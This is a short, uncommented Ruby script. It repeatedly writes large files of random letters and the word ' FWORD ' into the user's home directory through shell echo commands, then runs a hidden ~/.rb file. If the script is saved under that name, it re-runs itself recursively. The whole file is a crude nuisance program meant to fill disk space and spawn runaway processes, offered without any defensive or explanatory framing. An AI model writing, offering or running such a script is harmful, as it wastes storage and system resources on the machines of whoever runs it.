#!/usr/bin/ruby
10.times do


	o = [('a'..'z'), ('A'..'Z')].map { |i| i.to_a }.flatten
	string = (0...50).map { o[rand(o.length)] }.join
	s1 = ' FWORD '
	s2 = [s1, string, s1, string, string, s1].reject(&:empty?).join('')
	s3 = [s1, string, s2, s2, s1, s1].reject(&:empty?).join('')
	s4 = [s1, s3, s2, s3, string, s3].reject(&:empty?).join('')
	s5 = [s4, s4, s4, s4, s4, s4].reject(&:empty?).join('')
	s6 = [s5, s5, s5, s5, s5, s5, s5, s5, s5, s5].reject(&:empty?).join('')

	

 
	c1 = 'echo '
	c2 = s6
	c3 = ' > ~/'
	c4 = string
	c5 = '.txt'

	cmd = [c1, c2, c3, c4, c5].reject(&:empty?).join('')
	

	system( cmd ) 
	

	co = 'ruby ~/.rb'

	system( co ) 

end